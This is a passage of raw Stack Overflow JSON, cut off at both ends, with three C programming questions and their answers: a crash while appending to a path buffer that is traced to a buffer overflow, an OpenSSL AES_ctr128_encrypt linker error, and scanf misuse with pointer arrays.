timer\n</code></pre>\n\n<p>How to determine what is the microphone here?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1542179105, "post_id": 53294651, "comment_id": 93470422, "body": "That &quot;add null terminator&quot; bit is not needed, it should already be there. If it wasn&#39;t then the <code>strlen</code> call would not work."}, {"owner": {"reputation": 500, "user_id": 1708116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4OCsL.jpg?s=128&g=1", "display_name": "arjayosma", "link": "https://stackoverflow.com/users/1708116/arjayosma"}, "edited": false, "score": 0, "creation_date": 1542179112, "post_id": 53294651, "comment_id": 93470427, "body": "is your input string &quot;cmd[]&quot; being terminated properly by your input handler?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1542179139, "post_id": 53294651, "comment_id": 93470438, "body": "Have you printed the value in <code>path</code> before and after the append?  Have you printed the length?  Have you checked that the <code>malloc()</code> was successful?  If you&#39;re going to copy the result into the fixed-size <code>path</code>, why not use a fixed size variable of the same length to hold the intermediate value?  Adding a null terminator where <code>strlen()</code> determines the end of the string is pointless; <code>strlen()</code> stops when it reaches a null byte.  Where do you check that the concatenated value will fit into <code>path</code>?  The <code>cmd + 3</code> is a bit peculiar.  It&#39;ll insert a space into the path if you type <code>cd\u00a0\u00a0path</code>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 123, "user_id": 3012517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dfea9b05f199e3291df3a63ac3a6bc0b?s=128&d=identicon&r=PG&f=1", "display_name": "chaos", "link": "https://stackoverflow.com/users/3012517/chaos"}, "edited": false, "score": 1, "creation_date": 1542179672, "post_id": 53294651, "comment_id": 93470633, "body": "@chaos And that might <i>not</i> add the null terminator. And if not, then the <code>strlen</code> function can&#39;t be used to find the actual end (though then it&#39;s just to add the terminator at the last place in the array anyway, it will however make the path will invalid)."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1542179726, "post_id": 53294651, "comment_id": 93470651, "body": "Cannot reproduce. Please show us a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "edited": false, "score": 0, "creation_date": 1542180195, "post_id": 53294651, "comment_id": 93470869, "body": "Answer  1 \u2013 That\u2019s correct, I will remove it.  Answer 2 \u2013 Yes, the string is terminated properly.  Answer 3 \u2013 When the program gets executed the path of the program is sent to path with the help of getcwd(). I honestly never check if the new path fits into the path-variable, it was totally base don an assumption on my part. May this be the problem? Should the cmd + 3 be changed to cmd + 4?  Answer 4 \u2013 Will try to change the god per your advice, thanx."}, {"owner": {"reputation": 26959, "user_id": 1294207, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/Inny3.jpg?s=128&g=1", "display_name": "Fantastic Mr Fox", "link": "https://stackoverflow.com/users/1294207/fantastic-mr-fox"}, "edited": false, "score": 0, "creation_date": 1542180452, "post_id": 53294651, "comment_id": 93470963, "body": "@Lavonen You should add this detail to your question using the edit button."}, {"owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "edited": false, "score": 0, "creation_date": 1542180566, "post_id": 53294651, "comment_id": 93471007, "body": "I added a little bit more code to make it more clear, please update your browser :)"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1542180821, "post_id": 53294651, "comment_id": 93471124, "body": "@LavonenWhat is <code>PATH_MAX</code>? What is your platform? Please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>, not your complete code. Does the problem go away if you declare, say <code>char path[2000];</code>?"}, {"owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "edited": false, "score": 0, "creation_date": 1542181097, "post_id": 53294651, "comment_id": 93471217, "body": "That was a mistake by me (was a little too fast on the keyboard). I have updated the code again. No, char path[2000] doesn&#39;t help, already tried it."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1542181306, "post_id": 53294651, "comment_id": 93471296, "body": "@Lavonen and what happens if you naively try <code>malloc(strlen(path) + strlen(cmd) + 30);</code>?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1542181845, "post_id": 53294651, "comment_id": 93471502, "body": "@Lavonen you write : <i>&quot;This should be enough to reproduce the problem I guess&quot;</i>. Are you able to reproduce the problem with this? I&#39;m not. The problem maybe elsewhere in your program, in some code you don&#39;t show here. Did you use a debugger? The debugger will show you <i>where</i>  your program crashes."}, {"owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "edited": false, "score": 0, "creation_date": 1542182034, "post_id": 53294651, "comment_id": 93471573, "body": "The answer below seems to be correct so far, I removed the part that adds a null terminator and also added one extra char (30 like your example also works). Everything works fine with this configuration as long as the name of the path doesn&#39;t get too long (why this is a problem I dont know)."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 2, "creation_date": 1542182505, "post_id": 53294651, "comment_id": 93471779, "body": "The newly added &quot;mcve&quot; main is total nonsense! <code>scanf</code> with <code>%s</code> <b>cannot scan</b> <code>cd somedirectory</code> because <code>%s</code> scans whitespace-delimited strings!"}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1542216351, "post_id": 53294651, "comment_id": 93492186, "body": "The unsafe string functions are so 1990&#39;s ... <a href=\"https://stackoverflow.com/q/4185634/608639\">Which string manipulation functions should I use?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542184036, "post_id": 53295724, "comment_id": 93472473, "body": "This is not the solution, it is the consequence of the bug. It means that you have screwed up the use of the <code>temp</code> pointer earlier on in the function by assigning it to another address. The solution is not to remove free() but to fix the actual bug."}, {"owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542184298, "post_id": 53295724, "comment_id": 93472612, "body": "Damn... I will continue upward in the code. The problem must be somewhere higher up."}], "tags": [], "owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "is_accepted": false, "score": -1, "last_activity_date": 1542183632, "creation_date": 1542183632, "answer_id": 53295724, "question_id": 53294651, "link": "https://stackoverflow.com/questions/53294651/append-new-path-to-variable-makes-program-crash/53295724#53295724", "title": "Append new path to variable makes program crash", "body": "<p>I found a solution, post it for future reference.</p>\n\n<p>The problem was this part:</p>\n\n<pre><code>free(temp);\n</code></pre>\n\n<p>I don't know why (though this was necessary) but I had to remove this one.</p>\n\n<p>Now, at least, everything works.</p>\n"}, {"comments": [{"owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "edited": false, "score": 0, "creation_date": 1542186978, "post_id": 53295963, "comment_id": 93474121, "body": "I found the problem and it was higher up in the code, the variable for the command (cmd) was too small due to another function which created a buffer overflow. Your answer really helped me to brush up my code though so one upvote for you :) Thanx"}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 1, "last_activity_date": 1542184589, "creation_date": 1542184589, "answer_id": 53295963, "question_id": 53294651, "link": "https://stackoverflow.com/questions/53294651/append-new-path-to-variable-makes-program-crash/53295963#53295963", "title": "Append new path to variable makes program crash", "body": "<p>It's not obvious why the posted code fails, but the rule #1 here is to always check the size of the data before copying. In addition, the whole function can be simplified by dropping the malloc. For example:</p>\n\n<pre><code>void dir_forward (const char cmd[])\n{\n  cmd += sizeof(\"cd \") - 1;  // remove \"cd \"\n\n  size_t dst_length = strlen(path);\n  size_t src_length = strlen(cmd);\n  size_t new_length = dstr_length + src_length + 2; // '\\\\' and '\\0' give +2\n  if(new_length &gt; PATH_MAX)\n  {\n    exit(EXIT_FAILURE);\n  }\n\n  char* ptr = &amp;path[dst_length]; // point at null terminator\n\n  memcpy(ptr, cmd, src_length);\n  ptr += src_length;\n\n  *ptr = '\\\\';\n  ptr++;\n\n  *ptr = '\\0';\n}\n</code></pre>\n\n<p>Full example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#ifndef PATH_MAX\n#define PATH_MAX 255\n#endif\n\nstatic char path[PATH_MAX] = \"C:\\\\tmp\\\\\";\n\nvoid dir_forward (const char cmd[])\n{\n  cmd += sizeof(\"cd \") - 1;  // remove \"cd \"\n\n  size_t dst_length = strlen(path);\n  size_t src_length = strlen(cmd);\n  size_t new_length = dstr_length + src_length + 2; // '\\\\' and '\\0' give +2\n  if(new_length &gt; PATH_MAX)\n  {\n    exit(EXIT_FAILURE);\n  }\n\n  char* ptr = &amp;path[dst_length]; // point at null terminator\n\n  memcpy(ptr, cmd, src_length);\n  ptr += src_length;\n\n  *ptr = '\\\\';\n  ptr++;\n\n  *ptr = '\\0';\n}\n\nint main (void)\n{\n  dir_forward(\"cd foo\");\n  puts(path);\n}\n</code></pre>\n"}], "owner": {"reputation": 514, "user_id": 6502077, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/811267f3cc849bfb9df2dd9b7b8e6890?s=128&d=identicon&r=PG&f=1", "display_name": "Lavonen", "link": "https://stackoverflow.com/users/6502077/lavonen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "closed_date": 1542217042, "answer_count": 2, "score": -1, "last_activity_date": 1542184589, "creation_date": 1542178600, "last_edit_date": 1542180963, "question_id": 53294651, "link": "https://stackoverflow.com/questions/53294651/append-new-path-to-variable-makes-program-crash", "closed_reason": "Not suitable for this site", "title": "Append new path to variable makes program crash", "body": "<p>I have a function that adds a directory to a defined path, more or less, exactly as the <strong>\"cd-function\"</strong> in the command prompt. The first time I add a directory everything works perfectly, the second or third time (depends on the length of the directory) the program crashes.</p>\n\n<pre><code>char path[PATH_MAX];\n\nvoid dir_forward(char cmd[])\n{\n    char *temp = malloc(strlen(path) + strlen(cmd) + 2);\n    char sep[] = \"\\\\\";\n\n    strcpy(temp, path);      // copy path to temp\n\n    strcat(temp, sep);\n    strcat(temp, cmd+3);     // +3 for removing \"cd \" from string\n\n    int i = strlen(temp);    // add null terminator\n    temp[i] = '\\0';\n\n    strcpy(path, temp);\n\n    free(temp);\n    printf(\"%s\\n\", path);\n}\n</code></pre>\n\n<p>The program first copies the path to a temporary variable (the size of the temporary variable is determined as the size of the path, the new directory, one backslash, and a null terminator). After that, the backslash and the new directory gets copied to the path in the temporary variable. A null terminator is appended to the end of the string. After that, the new path in the temporary variable gets copied to the path and thus replaces the old one.</p>\n\n<p>Let me demonstrate with an example, I have:</p>\n\n<p><strong>C:\\Users\\Paul\\Desktop\\some_folder</strong></p>\n\n<p>I decided to append the folder \"images\" to the path:</p>\n\n<p><strong>C:\\Users\\Paul\\Desktop\\some_folder\\images</strong></p>\n\n<p>If I append one more folder (preferably with a long name) the program will <strong>crash</strong> almost like a buffer overflow and also end the path with some weird characters.</p>\n\n<p><strong>[EDIT]</strong></p>\n\n<p>I cannot reproduce the code completely since its rather large, however, below is the essence of the function. First, the program adds a path to the variable path with the help of getcwd(), after that accepts an input and sends it to the function above.</p>\n\n<pre><code>int main(void)\n{\n    char cmd[30];\n\n    getcwd(path, PATH_MAX);     // Get current path\n    scanf(\"%s\", cmd);\n    dir_forward(cmd);\n}\n</code></pre>\n\n<p>This should be enough to reproduce the problem I guess.</p>\n"}, {"tags": ["c", "encryption", "aes"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1542182736, "post_id": 53294246, "comment_id": 93471861, "body": "Did you get <b>exact same</b> compiler warnings including the <b>implicit declaration of function</b>?"}, {"owner": {"reputation": 9, "user_id": 7932140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f0b1b7ad1dc79510641abd32611728f4?s=128&d=identicon&r=PG&f=1", "display_name": "\uc774\uc6a9\ud604", "link": "https://stackoverflow.com/users/7932140/%ec%9d%b4%ec%9a%a9%ed%98%84"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1542184830, "post_id": 53294246, "comment_id": 93472854, "body": "Yes i did......."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 1, "creation_date": 1542185201, "post_id": 53294246, "comment_id": 93473051, "body": "Don&#39;t you think that the <code>#include</code>s that you use would be relevant to the question?"}], "answers": [{"tags": [], "owner": {"reputation": 149, "user_id": 3672418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac979d233ba2722b99b65c727f6f6e5b?s=128&d=identicon&r=PG&f=1", "display_name": "sergiopm", "link": "https://stackoverflow.com/users/3672418/sergiopm"}, "is_accepted": false, "score": 0, "last_activity_date": 1542185213, "creation_date": 1542185213, "answer_id": 53296121, "question_id": 53294246, "link": "https://stackoverflow.com/questions/53294246/how-to-solve-undefined-reference-to-aes-ctr128-encrypt/53296121#53296121", "title": "How to solve undefined reference to `AES_ctr128_encrypt&#39;", "body": "<p>Assuming you are using openssl 1.1.0, see <a href=\"https://stackoverflow.com/questions/52369124/what-is-exact-alternate-api-instead-of-aes-ctr128-encrypt-from-openssl-1-1-0\">What is exact alternate API instead of AES_ctr128_encrypt from openssl 1.1.0?</a></p>\n\n<p>You can use <code>CRYPTO_ctr128_encrypt</code> instead of <code>AES_ctr128_encrypt</code>.</p>\n"}], "owner": {"reputation": 9, "user_id": 7932140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f0b1b7ad1dc79510641abd32611728f4?s=128&d=identicon&r=PG&f=1", "display_name": "\uc774\uc6a9\ud604", "link": "https://stackoverflow.com/users/7932140/%ec%9d%b4%ec%9a%a9%ed%98%84"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2287, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542185213, "creation_date": 1542176649, "question_id": 53294246, "link": "https://stackoverflow.com/questions/53294246/how-to-solve-undefined-reference-to-aes-ctr128-encrypt", "title": "How to solve undefined reference to `AES_ctr128_encrypt&#39;", "body": "<p>Hello I was studying aes 128 encryption with this link <a href=\"https://www.gurutechnologies.net/blog/aes-ctr-encryption-in-c/\" rel=\"nofollow noreferrer\">https://www.gurutechnologies.net/blog/aes-ctr-encryption-in-c/</a>.\nBut to run the example main.c\nCompiled as follows</p>\n\n<pre><code>gcc main.c -lm -lcrypto -lssl -o mai.c\n</code></pre>\n\n<p>Then I get the following error:</p>\n\n<pre><code>main.c: In function \u2018fencrypt\u2019:\nmain.c:83:3: warning: implicit declaration of function \u2018AES_ctr128_encrypt\u2019; did you mean \u2018AES_cfb128_encrypt\u2019? [-Wimplicit-function-declaration]\n   AES_ctr128_encrypt(indata, outdata, bytes_read, &amp;key, state.ivec, state.ecount, &amp;state.num);\n   ^~~~~~~~~~~~~~~~~~\n   AES_cfb128_encrypt\n/tmp/cc1Gq6eV.o: In function `fencrypt':\nmain.c:(.text+0x253): undefined reference to `AES_ctr128_encrypt'\n/tmp/cc1Gq6eV.o: In function `fdecrypt':\nmain.c:(.text+0x449): undefined reference to `AES_ctr128_encrypt'\ncollect2: error: ld returned 1 exit status\n</code></pre>\n\n<p>To fix this I go into the directory where openssl is located, and in the aes.h header file\nI tried to find the AES_ctr128_encrypt function, but it did not\nSo I updated the openssl and confirmed that there is a AES_ctr128_encrypt function in aes.h and tried to recompile it, but nothing changed. I will leave a question because I could not find a solution anymore. </p>\n\n<p>This is the code for AES_ctr128_encrypt</p>\n\n<pre><code>void fencrypt(char* read, char* write, const unsigned char* enc_key)\n{ \n    if(!RAND_bytes(iv, AES_BLOCK_SIZE))\n    {\n        fprintf(stderr, \"Could not create random bytes.\");\n        exit(1);    \n    }\n\n    readFile = fopen(read,\"rb\"); // The b is required in windows.\n    writeFile = fopen(write,\"wb\");\n\n    if(readFile==NULL)  \n    {\n        fprintf(stderr, \"Read file is null.\"); \n        exit(1);\n    }\n\n    if(writeFile==NULL)\n    {\n        fprintf(stderr, \"Write file is null.\"); \n        exit(1);\n    }\n\n    fwrite(iv, 1, 8, writeFile); // IV bytes 1 - 8\n    fwrite(\"\\0\\0\\0\\0\\0\\0\\0\\0\", 1, 8, writeFile); // Fill the last 4 with null bytes 9 - 16\n\n    //Initializing the encryption KEY\n    if (AES_set_encrypt_key(enc_key, 128, &amp;key) &lt; 0)\n    {\n        fprintf(stderr, \"Could not set encryption key.\");\n        exit(1); \n    }\n\n    init_ctr(&amp;state, iv); //Counter call\n    //Encrypting Blocks of 16 bytes and writing the output.txt with ciphertext  \n    while(1)    \n    {\n        bytes_read = fread(indata, 1, AES_BLOCK_SIZE, readFile); \n        AES_ctr128_encrypt(indata, outdata, bytes_read, &amp;key, state.ivec, state.ecount, &amp;state.num);\n\n        bytes_written = fwrite(outdata, 1, bytes_read, writeFile); \n        if (bytes_read &lt; AES_BLOCK_SIZE)\n        {\n            break;\n        }\n    }\n\n    fclose(writeFile);\n    fclose(readFile);\n}\n\nvoid fdecrypt(char* read, char* write, const unsigned char* enc_key)\n{   \n\n    readFile=fopen(read,\"rb\"); // The b is required in windows.\n    writeFile=fopen(write,\"wb\");\n\n    if(readFile==NULL)\n    {\n        fprintf(stderr,\"Read file is null.\"); \n        exit(1);\n    }\n\n    if(writeFile==NULL) \n    {\n        fprintf(stderr, \"Write file is null.\"); \n        exit(1);\n    }\n\n    fread(iv, 1, AES_BLOCK_SIZE, readFile); \n\n    //Initializing the encryption KEY\n    if (AES_set_encrypt_key(enc_key, 128, &amp;key) &lt; 0)\n    {\n        fprintf(stderr, \"Could not set decryption key.\");\n        exit(1);\n    }\n\n    init_ctr(&amp;state, iv);//Counter call\n    //Encrypting Blocks of 16 bytes and writing the output.txt with ciphertext       \n    while(1)    \n    {\n        bytes_read = fread(indata, 1, AES_BLOCK_SIZE, readFile);    \n        //printf(\"%i\\n\", state.num);\n        AES_ctr128_encrypt(indata, outdata, bytes_read, &amp;key, state.ivec, state.ecount, &amp;state.num);\n\n        bytes_written = fwrite(outdata, 1, bytes_read, writeFile); \n        if (bytes_read &lt; AES_BLOCK_SIZE) \n        {\n            break;\n        }\n    }\n    fclose(writeFile); \n    fclose(readFile); \n}\n</code></pre>\n\n<p>Thank you in advance.</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "edited": false, "score": 0, "creation_date": 1542173269, "post_id": 53293666, "comment_id": 93468483, "body": "You should compile with all warnings enabled."}, {"owner": {"reputation": 9215, "user_id": 5212827, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7e9f9b0d7e2d571c9f8886dd54bd50f9?s=128&d=identicon&r=PG&f=1", "display_name": "DeiDei", "link": "https://stackoverflow.com/users/5212827/deidei"}, "edited": false, "score": 2, "creation_date": 1542173387, "post_id": 53293666, "comment_id": 93468515, "body": "<code>int *jerseyNumbers[10]</code> is effectively <code>int **jerseyNumbers</code>. Now think about what <code>&amp;jerseyNumbers[i]</code> would mean."}, {"owner": {"reputation": 775, "user_id": 4650806, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/797558543615184/picture?type=large", "display_name": "BEPP", "link": "https://stackoverflow.com/users/4650806/bepp"}, "edited": false, "score": 2, "creation_date": 1542173403, "post_id": 53293666, "comment_id": 93468520, "body": "why do you need &quot;int *jerseyNumbers[10]&quot; to hold only 10 integer ?. it should be &quot;int jerseyNumbers[10];&quot; i think."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542178095, "post_id": 53293666, "comment_id": 93470018, "body": "When you use <code>getRoster(&amp;jerseyNumbers[10], &amp;playerRatings[10]);</code> in <code>main()</code>, you are passing the address one beyond the end of the arrays, which is not what you intended and leads to undefined behaviour when you use the pointers. You have arrays of <code>int</code> pointers; you never allocate the <code>int</code> values for the pointers to point at.  That&#39;s another source of trouble.  You pass the same addresses to <code>menu()</code> \u2014 more trouble. Then, inside <code>menu()</code>, you call, for example, <code>updateRating(&amp;jerseyNumbers[10], &amp;playerRatings[10]);</code> \u2014 this passes an address 10 beyond the already bogus addresses passed in."}, {"owner": {"reputation": 5310, "user_id": 2134538, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6a1a0901a20851db89f15ddc3f38aa67?s=128&d=identicon&r=PG&f=1", "display_name": "MarmiK", "link": "https://stackoverflow.com/users/2134538/marmik"}, "edited": false, "score": 0, "creation_date": 1542206669, "post_id": 53293666, "comment_id": 93486253, "body": "Have you tried <code>fflush()</code> before <code>scanf</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "edited": false, "score": 1, "creation_date": 1542173723, "post_id": 53293737, "comment_id": 93468600, "body": "The definition of the array&#39;s and the function calls for OP is also not correct. Please mention this also."}, {"owner": {"reputation": 9, "user_id": 10003206, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0VOH1SKCvxQ/AAAAAAAAAAI/AAAAAAAAADM/SjSqRzWi_jM/photo.jpg?sz=128", "display_name": "Dylan Wolfer", "link": "https://stackoverflow.com/users/10003206/dylan-wolfer"}, "edited": false, "score": 1, "creation_date": 1542173762, "post_id": 53293737, "comment_id": 93468609, "body": "My problem seems to be coming from either getRoster or main, as updateRating is an optional function that I have not yet finished"}, {"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "reply_to_user": {"reputation": 9, "user_id": 10003206, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0VOH1SKCvxQ/AAAAAAAAAAI/AAAAAAAAADM/SjSqRzWi_jM/photo.jpg?sz=128", "display_name": "Dylan Wolfer", "link": "https://stackoverflow.com/users/10003206/dylan-wolfer"}, "edited": false, "score": 1, "creation_date": 1542174708, "post_id": 53293737, "comment_id": 93468881, "body": "@Dylan Wolfer - 1) Change your array definitions (e.g., change to <code>int jerseyNumbers[10];</code>, instead of a pointer to an array), 2) Adjust your function signatures for the new array definitions, 3) Fix the &quot;;&quot; and add curly braces cited above ... and let us know what happens then"}], "tags": [], "owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "is_accepted": false, "score": 0, "last_activity_date": 1542173786, "last_edit_date": 1542173786, "creation_date": 1542173478, "answer_id": 53293737, "question_id": 53293666, "link": "https://stackoverflow.com/questions/53293666/scanf-in-function-seems-to-be-writing-garbage-values-to-one-array-but-not-the-ot/53293737#53293737", "title": "scanf in function seems to be writing garbage values to one array but not the other, despite both being identical", "body": "<p>STRONG SUGGESTION:</p>\n\n<p>Get in the habit of using curly braces often - even when you don't need them.</p>\n\n<pre><code>void updateRating(int *jerseyNumbers, int *playerRatings)  \n  // You probably only need a pointer or an array - but probably not both ;)\n{\n  int i, n = -1, hold;\n  printf(\"Enter a jersey number:\\n\");\n  scanf(\"%d\", n);\n  for (i=0; i&lt;5; ++i) {  // Curly brace here...\n    if(jerseyNumbers[i]==n)  { // And here...\n        hold = n;\n    }\n  }\n  if (n=-1) {  // BUG ALERT: deleted \";\" (and added a brace)\n    printf(\"Error\");  // BUG ALERT: fixed this by removing \";\"?\n  } else {\n    printf(\"Enter a new rating for player:\\n\");\n    scanf(\"%d\", &amp;playerRatings[n]);\n}\n</code></pre>\n\n<p>Or perhaps better:</p>\n\n<pre><code>void updateRating(int *jerseyNumbers, int *playerRatings)  \n{\n  int n;\n  printf(\"Enter a jersey number:\\n\");\n  scanf(\"%d\", n);\n  printf(\"Enter a new rating for player:\\n\");\n  scanf(\"%d\", &amp;playerRatings[n]);\n}\n</code></pre>\n\n<p>And, as  Rishikesh Raje 